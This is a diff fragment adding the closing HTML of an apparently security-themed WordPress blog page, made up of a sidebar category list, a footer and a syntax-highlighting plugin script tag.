+</li>
+	<li class="cat-item cat-item-56">
+<a href="/category/pwk/">PWK</a>
+</li>
+	<li class="cat-item cat-item-54">
+<a href="/category/development/python/">Python</a>
+</li>
+	<li class="cat-item cat-item-15">
+<a href="/category/infosec/hash/salt/">Salt</a>
+</li>
+	<li class="cat-item cat-item-28">
+<a href="/category/shell/">Shell</a>
+</li>
+	<li class="cat-item cat-item-43">
+<a href="/category/education/online-course/stanford-online/">Stanford Online</a>
+</li>
+	<li class="cat-item cat-item-1">
+<a href="/category/uncategorized/">Uncategorized</a>
+</li>
+	<li class="cat-item cat-item-38">
+<a href="/category/unix/">Unix</a>
+</li>
+	<li class="cat-item cat-item-31">
+<a href="/category/web-server/">Web Server</a>
+</li>
+	<li class="cat-item cat-item-6">
+<a href="/category/infosec/webapp/">WebApp</a>
+</li>
+	<li class="cat-item cat-item-51">
+<a href="/category/infosec/white-hat/">White Hat</a>
+</li>
+	<li class="cat-item cat-item-34">
+<a href="/category/infosec/webapp/windows-live/">Windows Live</a>
+</li>
+	<li class="cat-item cat-item-49">
+<a href="/category/development/xcode/">XCode</a>
+</li>
+	<li class="cat-item cat-item-26">
+<a href="/category/comic/xkcd/">XKCD</a>
+</li>
+			</ul>
+
+			</aside>		</div>
+<!-- #secondary .widget-area -->
+
+	</div>
+<!-- #main -->
+
+	<footer id="colophon">
+
+			
+
+			<div id="site-generator">
+												<a href="https://wordpress.org/" class="imprint" title="Semantic Personal Publishing Platform">
+					Proudly powered by WordPress				</a>
+			</div>
+	</footer><!-- #colophon -->
+</div>
+<!-- #page -->
+
+<script type="text/javascript" src="/wp-content/plugins/wp-syntax/js/wp-syntax.js?ver=1.2" id="wp-syntax-js-js"></script>
+
+</body>
+</html>
